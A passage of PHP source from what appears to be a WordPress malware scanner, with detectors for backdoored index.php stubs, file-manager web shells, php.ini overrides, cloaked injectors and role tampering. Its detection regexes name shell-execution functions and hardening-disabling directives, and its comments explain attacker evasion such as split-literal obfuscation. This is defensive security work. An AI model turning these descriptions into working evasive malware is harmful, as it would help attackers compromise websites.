	 * code, so the size threshold is generous and the check requires actual
	 * executable content rather than merely being large.
	 *
	 * Review-only: some legitimate plugins do put a functional index.php at
	 * their root, so this reports rather than removes. The packer check above
	 * handles the confirmed-malicious overlap and removes those.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_index_stub_anomaly(): array {
		$found = [];
		$roots = [];
		if ( defined( 'WP_PLUGIN_DIR' ) )   $roots[] = WP_PLUGIN_DIR;
		if ( defined( 'WPMU_PLUGIN_DIR' ) ) $roots[] = WPMU_PLUGIN_DIR;
		if ( defined( 'WP_CONTENT_DIR' ) ) {
			$roots[] = WP_CONTENT_DIR . '/themes';
			$roots[] = WP_CONTENT_DIR . '/uploads';
		}

		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( strtolower( $f->getFilename() ) !== 'index.php' ) continue;
					if ( $f->getSize() < 2048 ) continue; // real stubs are tens of bytes

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					// Must actually carry executable logic, not just a long comment.
					if ( ! preg_match( '/\b(eval|assert|base64_decode|gzinflate|gzuncompress|str_rot13|create_function|system|shell_exec|passthru|proc_open|file_put_contents|curl_exec|fsockopen|move_uploaded_file|goto)\s*[\(\s]/i', $contents ) ) {
						continue;
					}

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Executable payload in a directory index stub',
						'subject'  => basename( dirname( $path ) ) . '/index.php',
						'path'     => $path,
						'match'    => size_format( (int) $f->getSize() ) . ' index.php carrying executable logic',
						'action'   => 'index.php files in plugin, theme, and upload directories are normally tiny "Silence is golden" placeholders that exist only to prevent directory listing - which is exactly why backdoors are hidden in them, since nobody reads a file they believe is empty. This one is '
							. size_format( (int) $f->getSize() ) . ' and contains executable code. Open it and confirm what it does. If the surrounding plugin is otherwise genuine, the plugin is very likely legitimate software being used as camouflage for this single file. Reported for review because a small number of plugins do use a functional root index.php.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'index-stub scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.4: file-operation web shells - shells that never execute code.
	 *
	 * Confirmed gap: a 283-line, entirely unobfuscated shell sat in two live
	 * samples and every execution-oriented detector missed it, because it
	 * contains no eval, no assert, no system, no shell_exec and no encoded
	 * payload. It does not need them. It browses directories, writes files,
	 * deletes them, creates folders, and accepts uploads - all driven
	 * straight from request superglobals. An attacker uploads a PHP file and
	 * then requests it; the web server does the executing.
	 *
	 * check_generic_webshell_patterns() looks for user input inside an
	 * execution construct, which is the right signature for a classic RCE
	 * shell and structurally blind to this one. check_file_manager_shell()
	 * (1.4.1) catches Tiny File Manager by its constant cluster, which is
	 * brand-specific. This check is neither: it matches the CAPABILITY
	 * CLUSTER, so a custom shell nobody has seen before is still caught.
	 *
	 * False positives are the real risk here, since legitimate media and
	 * backup plugins do touch the filesystem. Three things keep it tight:
	 * the capabilities must co-occur in a SINGLE file (real plugins spread
	 * this across classes), they must be driven by raw superglobals rather
	 * than sanitised WordPress APIs, and remediation is gated on position -
	 * removal only where the file has no business existing at all.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_file_operation_shell(): array {
		$found    = [];
		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		// Capability groups. The shell shape is: read the tree, change the
		// tree, and accept new files - all from request input.
		$browse = '/\b(scandir|opendir|readdir|glob)\s*\(/i';
		$mutate = [
			'unlink'            => '/\bunlink\s*\(/i',
			'rmdir'             => '/\brmdir\s*\(/i',
			'mkdir'             => '/\bmkdir\s*\(/i',
			'rename'            => '/\brename\s*\(/i',
			'file_put_contents' => '/\bfile_put_contents\s*\(/i',
			'fwrite'            => '/\bfwrite\s*\(/i',
			'chmod'             => '/\bchmod\s*\(/i',
			'copy'              => '/\bcopy\s*\(/i',
		];
		$upload = '/\bmove_uploaded_file\s*\(|\$_FILES\b/i';

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) continue;
					$size = $f->getSize();
					if ( $size < 1024 || $size > 1048576 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					// Raw request input is the driver. Sanitised WP APIs are not
					// counted, which is what keeps well-written plugins out.
					$supers = [];
					foreach ( [ 'POST', 'GET', 'REQUEST', 'FILES' ] as $sg ) {
						if ( preg_match( '/\$_' . $sg . '\s*\[/', $contents ) ) $supers[] = '$_' . $sg;
					}
					if ( count( $supers ) < 2 ) continue;

					if ( ! preg_match( $browse, $contents ) ) continue;

					$muts = [];
					foreach ( $mutate as $name => $re ) {
						if ( preg_match( $re, $contents ) ) $muts[] = $name;
					}
					$can_upload = (bool) preg_match( $upload, $contents );

					// Needs breadth: browsing plus several distinct mutations,
					// or browsing plus upload plus at least a couple.
					if ( count( $muts ) < 3 ) continue;
					if ( ! $can_upload && count( $muts ) < 4 ) continue;

					// Position drives severity and remediation, exactly as in
					// the 1.4.1 file-manager check.
					$base    = strtolower( $f->getFilename() );
					$in_stub = ( $base === 'index.php' );
					$norm    = strtolower( str_replace( '\\', '/', (string) ( $real ?: $path ) ) );
					$in_hot  = false;
					foreach ( [ '/uploads/', '/cache/', '/mu-plugins/' ] as $hot ) {
						if ( strpos( $norm, $hot ) !== false ) { $in_hot = true; break; }
					}

					$caps = 'browse (' . ( preg_match( '/\bscandir\s*\(/i', $contents ) ? 'scandir' : 'opendir/glob' ) . ')'
						. ', mutate (' . implode( ', ', array_slice( $muts, 0, 5 ) ) . ')'
						. ( $can_upload ? ', upload' : '' )
						. ', driven by ' . implode( '/', $supers );

					$finding = [
						'severity' => ( $in_stub || $in_hot ) ? 'critical' : 'high',
						'type'     => 'File-operation web shell (no code execution required)',
						'subject'  => basename( dirname( $path ) ) . '/' . basename( $path ),
						'path'     => $path,
						'match'    => $caps,
					];

					if ( $in_stub ) {
						$finding['action']      = 'This file browses directories, modifies files, and accepts uploads directly from request parameters - a complete file-management web shell - and it is sitting where WordPress expects a one-line placeholder. It needs no eval or shell_exec to be dangerous: an attacker uploads a PHP file through it and then simply requests that file. It has been removed. Check the rest of the directory, and treat every credential the site uses as compromised.';
						$finding['auto_delete'] = true;
						$finding['delete_path'] = $path;
					} else {
						$finding['action']      = 'This file combines directory browsing, file modification'
							. ( $can_upload ? ', and file upload' : '' )
							. ' driven directly by request parameters (' . implode( ', ', $supers ) . '), which is the shape of a file-management web shell. It contains no eval or shell_exec, so execution-focused scanners do not flag it, but an uploaded PHP file is executed by the web server regardless. Reported for review: some media and backup plugins legitimately do this work. If you cannot account for this file, delete it and rotate every credential the site uses.';
					}

					$found[] = $finding;
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'file-op shell scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.4: PHP configuration files that switch hardening back off.
	 *
	 * A live sample shipped a php.ini inside its plugin folder setting
	 * disable_functions to NONE, open_basedir off, and exec/shell_exec on.
	 * On CGI and FastCGI setups a per-directory php.ini is honoured, and
	 * .user.ini is the PHP-FPM equivalent - so an attacker who cannot run
	 * exec() because the host disabled it simply drops a config file next to
	 * the payload and tries again.
	 *
	 * Nothing legitimate in a plugin or theme directory needs to re-enable
	 * shell execution or remove an open_basedir restriction. Detection reads
	 * the directives rather than any particular file, so a variant with
	 * different spacing, casing, or ordering is caught the same way.
	 *
	 * Review-only: on some hosts a php.ini in the web root is placed
	 * deliberately by the host or the site owner, and silently deleting
	 * configuration can take a site down. Inside wp-content it is called out
	 * far more strongly, because there is no legitimate reason for one there.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_php_config_override(): array {
		$found = [];
		$names = [ 'php.ini', '.user.ini' ];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		// Directive => why it matters when switched this way.
		$dangerous = [
			'/^\s*disable_functions\s*=\s*(none|off|\s*$)/im'          => 'disable_functions cleared (re-enables every blocked PHP function)',
			'/^\s*open_basedir\s*=\s*(off|none|\s*$)/im'               => 'open_basedir switched off (lifts the directory jail)',
			'/^\s*safe_mode\s*=\s*off/im'                              => 'safe_mode off',
			'/^\s*(exec|shell_exec|system|passthru|popen|proc_open)\s*=\s*(on|1|true)/im' => 'shell execution explicitly enabled',
			'/^\s*auto_prepend_file\s*=\s*\S+/im'                      => 'auto_prepend_file set (runs a file before every request)',
			'/^\s*auto_append_file\s*=\s*\S+/im'                       => 'auto_append_file set (runs a file after every request)',
			'/^\s*allow_url_include\s*=\s*(on|1|true)/im'              => 'allow_url_include on (permits remote file inclusion)',
		];

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
					if ( ! in_array( strtolower( $f->getFilename() ), $names, true ) ) continue;
					if ( $f->getSize() > 65536 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;

					$hits = [];
					foreach ( $dangerous as $re => $label ) {
						if ( preg_match( $re, $contents ) ) $hits[] = $label;
					}
					if ( ! $hits ) continue;

					// Inside wp-content there is no benign reading of this.
					$norm      = str_replace( '\\', '/', (string) ( $real ?: $path ) );
					$in_content = defined( 'WP_CONTENT_DIR' )
						&& strpos( $norm, str_replace( '\\', '/', rtrim( WP_CONTENT_DIR, '/\\' ) ) . '/' ) === 0;

					$found[] = [
						'severity' => $in_content ? 'critical' : 'high',
						'type'     => 'PHP configuration override weakening hardening'
							. ( $in_content ? ' (inside wp-content)' : '' ),
						'subject'  => basename( dirname( $path ) ) . '/' . $f->getFilename(),
						'path'     => $path,
						'match'    => implode( '; ', $hits ),
					'action'   => 'This ' . $f->getFilename() . ' turns PHP hardening back off: ' . implode( '; ', $hits ) . '. '
							. ( $in_content
								? 'It sits inside wp-content, where no plugin or theme has any legitimate reason to change PHP security settings - this is almost certainly an attacker re-enabling the functions your host disabled, so that a payload elsewhere can run shell commands. Remove it and hunt for that payload. '
								: 'Per-directory php.ini files are honoured on CGI and FastCGI setups, and .user.ini on PHP-FPM, so this genuinely changes how PHP behaves here. If you or your host did not place it deliberately, remove it. ' )
							. 'Reported for review rather than deleted automatically, because deleting configuration a host placed on purpose can break a working site.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'php-config scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.5: cloaked output injection - the "hide from the owner, hide from
	 * the crawlers, show everyone else" shape.
	 *
	 * Confirmed blind spot. A sample presenting itself as an image-optimiser
	 * plugin passed all sixteen existing detectors. Its indicators were
	 * already catalogued - six Polygon RPC endpoints, eth_call, the whole
	 * EtherHiding set - and still nothing matched, for two reasons. The
	 * payload lived encrypted inside a binary "resources" file, so no
	 * indicator string existed in plaintext anywhere on disk. And every
	 * identifier in the loader was split across concatenated fragments, so
	 * even wp_footer, googlebot and administrator were invisible to grep.
	 *
	 * The answer is to stop relying on strings appearing intact. Source is
	 * normalised first (WPS_Utils::normalise_split_literals), then matched on
	 * BEHAVIOUR rather than on any single token:
	 *
	 *   1. It checks for several crawler user-agents in order to stay hidden
	 *      from them - search engines, SEO tools, page-speed auditors, link
	 *      previewers.
	 *   2. It skips privileged logged-in users, so the site owner browsing
	 *      their own site never sees what visitors see.
	 *   3. It injects output into the rendered page.
	 *
	 * Each alone is ordinary. A geo-plugin checks user agents; a membership
	 * plugin checks roles; a hundred plugins inject footer markup. All three
	 * in one file describes something with no honest purpose: content shown
	 * to visitors and deliberately concealed from both the administrator and
	 * every tool that might report it.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_cloaked_injector(): array {
		$found    = [];
		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		$agents = method_exists( 'WPS_Indicators', 'crawler_cloak_user_agents' )
			? WPS_Indicators::crawler_cloak_user_agents() : [];
		$cachec = method_exists( 'WPS_Indicators', 'cache_suppression_constants' )
			? WPS_Indicators::cache_suppression_constants() : [];
		if ( ! $agents ) {
			return $found;
		}

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) continue;
					$size = $f->getSize();
					if ( $size < 512 || $size > 1048576 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$raw = @file_get_contents( $path );
					if ( $raw === false || $raw === '' ) continue;
					if ( self::is_whitelisted( $raw ) ) continue;

					// Defeat split-literal evasion before matching anything.
					$src = WPS_Utils::normalise_split_literals( $raw );

					// (1) crawler avoidance
					$matched_agents = [];
					foreach ( $agents as $a ) {
						if ( stripos( $src, $a ) !== false ) $matched_agents[] = $a;
					}
					if ( count( $matched_agents ) < 4 ) continue;
					// It must actually be inspecting the request's user agent,
					// not merely listing names (an analytics plugin might list
					// bots to exclude them from statistics, which is fine).
					if ( ! preg_match( '/HTTP_USER_AGENT/i', $src ) ) continue;

					// (2) privileged-user avoidance
					$role_skip = preg_match( '/\bis_user_logged_in\s*\(/i', $src )
						&& preg_match( '/\badministrator\b|\bcurrent_user_can\s*\(|->\s*roles\b|\bwp_get_current_user\s*\(/i', $src );

					// (3) output injection
					$injects = preg_match( '/wp_footer|wp_head|wp_print_inline_script_tag|wp_body_open/i', $src )
						|| preg_match( '/echo\s+[\'"]<\s*script|<\s*script\s*>/i', $src );

					if ( ! $role_skip || ! $injects ) continue;

					// Supporting tells - not required, but they sharpen the
					// report and separate a confirmed kit from a coincidence.
					$tells = [];
					$tells[] = count( $matched_agents ) . ' crawler user-agents checked for avoidance ('
						. implode( ', ', array_slice( $matched_agents, 0, 6 ) ) . ')';
					$tells[] = 'skips privileged logged-in users';
					$tells[] = 'injects markup into the rendered page';

					$splits = WPS_Utils::split_literal_count( $raw );
					if ( $splits >= 8 ) {
						$tells[] = 'identifiers split across ' . $splits . ' concatenations to defeat scanning';
					}
					$cache_hits = 0;
					foreach ( $cachec as $c ) {
						if ( strpos( $src, $c ) !== false ) $cache_hits++;
					}
					if ( $cache_hits >= 2 ) {
						$tells[] = 'suppresses page caching so the cloak is never cached';
					}
					if ( preg_match( '/gzinflate\s*\(|gzuncompress\s*\(|\bstrrev\s*\(/i', $src )
						&& preg_match( '/file_get_contents\s*\(/i', $src ) ) {
						$tells[] = 'decodes an external resource file at runtime';
					}

					// Where does the plugin/theme root sit? A fake plugin whose
					// whole purpose is this belongs to the campaign entirely.
					$container = self::containing_extension_dir( $path );

					$finding = [
						'severity' => 'critical',
						'type'     => 'Cloaked content injector (hidden from admins and crawlers)',
						'subject'  => $container !== '' ? basename( $container ) . '/' . basename( $path ) : basename( $path ),
						'path'     => $path,
						'match'    => implode( '; ', $tells ),
						'action'   => 'This file serves content to ordinary visitors while deliberately hiding it from you and from anyone who might report it: it returns early for logged-in administrators and editors, and again for '
							. count( $matched_agents ) . ' search-engine, SEO and page-speed crawlers, then injects markup into the page for everyone else. That is the defining behaviour of an injection campaign - you cannot see it by browsing your own site, and external scanners will report the site as clean. '
							. ( $splits >= 8 ? 'Every meaningful identifier in it is split across concatenated fragments specifically so that scanners searching for names like wp_footer or googlebot find nothing. ' : '' )
							. ( in_array( 'decodes an external resource file at runtime', $tells, true ) ? 'The payload itself is held encrypted in a separate resource file, so it never appears in readable form on disk. ' : '' )
							. 'To see what visitors are served, request the site with a plain browser user agent while logged out.',
					];

					// Content-confirmed: the cluster has no honest reading. If
					// the file sits in its own plugin/theme folder, that whole
					// folder is the malware - remove it, as the ClickFix family
					// is handled. auto_remediate() still refuses protected paths.
					if ( $container !== '' ) {
						$finding['auto_delete'] = true;
						$finding['delete_path'] = $container;
						$finding['action']     .= ' The containing directory has been removed.';
					}

					$found[] = $finding;
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'cloaked-injector scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * Resolve the plugin or theme directory a file belongs to, or '' when the
	 * file is not inside one. Used to decide whether a confirmed malicious
	 * file represents a whole fake extension or is an injection into
	 * something otherwise legitimate.
	 */
	private static function containing_extension_dir( string $path ): string {
		$norm = str_replace( '\\', '/', (string) ( realpath( $path ) ?: $path ) );
		$bases = [];
		if ( defined( 'WP_PLUGIN_DIR' ) )   $bases[] = WP_PLUGIN_DIR;
		if ( defined( 'WPMU_PLUGIN_DIR' ) ) $bases[] = WPMU_PLUGIN_DIR;
		if ( defined( 'WP_CONTENT_DIR' ) )  $bases[] = WP_CONTENT_DIR . '/themes';

		foreach ( $bases as $base ) {
			$b = str_replace( '\\', '/', (string) ( realpath( $base ) ?: $base ) );
			if ( $b === '' || strpos( $norm, $b . '/' ) !== 0 ) continue;
			$rest  = substr( $norm, strlen( $b ) + 1 );
			$first = strtok( $rest, '/' );
			if ( $first === false || $first === '' || strpos( $rest, '/' ) === false ) {
				continue; // file sits directly in plugins/ or themes/, no folder of its own
			}
			return $b . '/' . $first;
		}
		return '';
	}

	/**
	 * 1.4.5: identifier splitting as a standalone signal.
	 *
	 * Splitting every meaningful string across concatenated fragments -
	 * 'goog' . 'lebot', 's' . 'c' . 'r' . 'i' . 'p' . 't' - has exactly one
	 * purpose, which is defeating anything that searches source for known
	 * names. It is not minification, it is not a performance technique, and
	 * no build tool produces it.
	 *
	 * The threshold comes from measurement rather than intuition. Across this
	 * plugin's own twenty-four files - about 315 KB of code - the highest
	 * count in any single file is three. The confirmed sample carried seventy
	 * in under five kilobytes. Density is what separates them, so the check
	 * requires both an absolute floor and a rate, and reports for review
	 * because obfuscation on its own is a strong smell rather than proof.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_split_literal_obfuscation(): array {
		$found    = [];
		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) continue;
					$size = $f->getSize();
					if ( $size < 256 || $size > 1048576 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$raw = @file_get_contents( $path );
					if ( $raw === false || $raw === '' ) continue;
					if ( self::is_whitelisted( $raw ) ) continue;

					$splits = WPS_Utils::split_literal_count( $raw );
					if ( $splits < 10 ) continue;

					// Rate matters more than the raw count: a very large file
					// can accumulate a few honestly. Measured legitimate
					// maximum is about 0.01 per KB; require 100x that.
					$per_kb = $splits / max( 1, $size / 1024 );
					if ( $per_kb < 1.0 ) continue;

					$found[] = [
						'severity' => 'high',
						'type'     => 'Source deliberately obfuscated against scanning',
						'subject'  => basename( dirname( $path ) ) . '/' . basename( $path ),
						'path'     => $path,
						'match'    => $splits . ' split-literal concatenations (' . round( $per_kb, 1 ) . ' per KB)',
						'action'   => 'This file splits its strings across ' . $splits . ' concatenated fragments - writing wp_footer as three pieces glued together, for example. That has one purpose, which is to stop scanners and administrators finding known names in the source. No build tool or minifier produces this. For comparison, the highest count in any single file of this plugin\'s own code is three. Reported for review rather than removed, because obfuscation is a strong smell rather than proof of what the code does: open the file, and if you cannot account for it, treat it as hostile and rotate the site\'s credentials.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'split-literal scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.10: the account factory - registration settings and role capabilities.
	 *
	 * Driven by a live operator report: new accounts appearing on a site where
	 * "Anyone can register" was switched off. Every detector shipped before
	 * this one looks at files, and this attack leaves no file to look at.
	 *
	 * Three settings, any of which turns a WordPress install into an account
	 * factory, all of them ordinary-looking rows in wp_options:
	 *
	 *   users_can_register - open registration. Legitimate on plenty of sites,
	 *   so on its own it is only worth reporting when it was switched on after
	 *   this plugin recorded it as off.
	 *
	 *   default_role - the role handed to anyone who registers. WordPress ships
	 *   this as subscriber. Set to administrator, it means every visitor who
	 *   completes the registration form becomes an administrator, and the
	 *   attacker never has to touch a file or run a query again. Nobody sets
	 *   this by accident.
	 *
	 *   wp_user_roles - the capability table itself. The subtlest of the three:
	 *   leave default_role as subscriber, and instead grant the subscriber role
	 *   manage_options, edit_users, or activate_plugins. The Users screen then
	 *   shows a list of harmless-looking subscribers who can all install
	 *   plugins, and nothing about the account list looks wrong.
	 *
	 * Review-only, always. Site configuration is not malware, and silently
	 * rewriting a membership site's registration settings would be a worse
	 * failure than the one being detected. The finding says exactly which
	 * option to change and what to change it to.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_registration_settings(): array {
		$found = [];
		if ( ! function_exists( 'get_option' ) ) {
			return $found;
		}

		$privileged = [ 'administrator', 'super-admin', 'editor', 'author' ];
		$baseline   = get_option( 'wps_registration_baseline', null );
		$can_reg    = (int) get_option( 'users_can_register', 0 );
		$def_role   = strtolower( trim( (string) get_option( 'default_role', 'subscriber' ) ) );

		// --- default_role escalation: the sharpest of the three ---
		if ( in_array( $def_role, $privileged, true ) ) {
			$is_admin_role = in_array( $def_role, [ 'administrator', 'super-admin' ], true );
			$found[] = [
				'severity' => $is_admin_role ? 'critical' : 'high',
				'type'     => 'New-user default role set to ' . $def_role,
				'subject'  => 'default_role',
				'path'     => 'wp_options: default_role',
				'match'    => 'default_role = ' . $def_role . ( $can_reg ? ', registration OPEN' : ', registration closed' ),
				'action'   => ( $is_admin_role
						? 'Every account created through the registration form on this site becomes an ADMINISTRATOR. WordPress ships this setting as "subscriber" and there is no legitimate reason to change it to administrator - this is how an attacker keeps making accounts without touching a single file, which is why file scanning never finds it. '
						: 'New accounts on this site are created as ' . $def_role . ', which can publish and edit content. That is occasionally deliberate, but rarely. ' )
					. ( $can_reg
						? 'Registration is also open, so anyone who can reach wp-login.php can use it right now. Close registration first (Settings > General > Membership), then set the default role back to Subscriber. '
						: 'Registration is currently closed, which limits the immediate damage, but anything that can flip that switch back leaves this in place. Set the default role back to Subscriber. ' )
					. 'Then audit every account created since you last knew the site was clean, and rotate the authentication salts so any sessions those accounts hold are invalidated.',
			];
		}

		// --- registration switched on since we last looked ---
		if ( is_array( $baseline ) && isset( $baseline['users_can_register'] ) ) {
			$was = (int) $baseline['users_can_register'];
			if ( $was === 0 && $can_reg === 1 ) {
				$found[] = [
					'severity' => 'high',
					'type'     => 'Open registration switched on',
					'subject'  => 'users_can_register',
					'path'     => 'wp_options: users_can_register',
					'match'    => 'users_can_register 0 -> 1 since ' . (string) ( $baseline['recorded'] ?? 'the baseline was taken' ),
					'action'   => 'Registration was closed when this plugin last recorded the setting and is now open. If you opened it deliberately, nothing is wrong and the baseline will update on the next scan. If you did not, something else changed it, and the account it was opened to create may already exist - check Settings > General > Membership, close registration, and review the accounts created since the date above.',
				];
			}
		}

		// --- capability tampering: the quiet one ---
		$roles = get_option( 'wp_user_roles', null );
		if ( ! is_array( $roles ) && isset( $GLOBALS['wpdb'] ) && is_object( $GLOBALS['wpdb'] ) ) {
			$roles = get_option( $GLOBALS['wpdb']->prefix . 'user_roles', null );
		}
		if ( is_array( $roles ) ) {
			$dangerous = [ 'manage_options', 'edit_users', 'create_users', 'promote_users', 'activate_plugins', 'edit_plugins', 'edit_themes', 'install_plugins', 'unfiltered_upload' ];
			foreach ( $roles as $slug => $def ) {
				$slug = strtolower( (string) $slug );
				if ( in_array( $slug, [ 'administrator', 'super-admin' ], true ) ) {
					continue; // administrators are supposed to have these
				}
				if ( ! is_array( $def ) || empty( $def['capabilities'] ) || ! is_array( $def['capabilities'] ) ) {
					continue;
				}
				$granted = [];
				foreach ( $dangerous as $cap ) {
					if ( ! empty( $def['capabilities'][ $cap ] ) ) {
						$granted[] = $cap;
					}
				}
				if ( ! $granted ) {
					continue;
				}
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Role "' . $slug . '" granted administrator-level capabilities',
					'subject'  => 'wp_user_roles: ' . $slug,
					'path'     => 'wp_options: wp_user_roles',
					'match'    => $slug . ' has ' . implode( ', ', $granted ),
					'action'   => 'The "' . $slug . '" role has been given capabilities it does not ship with: ' . implode( ', ', $granted ) . '. This is the quietest way to hold administrator access on a WordPress site, because the Users screen still shows ordinary-looking accounts - a list of subscribers who can all install plugins looks like a list of subscribers. Some membership and e-commerce plugins do legitimately extend roles, so check whether one of yours is responsible before acting. If none is, restore the role to its defaults and treat every account holding it as hostile.',
				];
			}
		}

		// Refresh the baseline so the next scan compares against current truth.
		if ( function_exists( 'update_option' ) ) {
			update_option( 'wps_registration_baseline', [
				'users_can_register' => $can_reg,
				'default_role'       => $def_role,
				'recorded'           => gmdate( 'Y-m-d H:i:s' ) . ' UTC',
			], false );
		}

		return $found;
	}

	/**
	 * 1.4.11: plugins the operator declares as their own.
	 *
	 * @return array<int, string> lowercased slugs
	 */
	private static function first_party_slugs(): array {
		$opts = get_option( WPS_OPTION, [] );
		$raw  = is_array( $opts ) ? (string) ( $opts['first_party_plugins'] ?? '' ) : '';
		if ( trim( $raw ) === '' ) {
			return [];
		}
		$out = [];
		foreach ( preg_split( '/[\r\n,]+/', $raw ) ?: [] as $line ) {
			$slug = strtolower( trim( (string) $line ) );
			$slug = trim( $slug, "/\\ \t" );
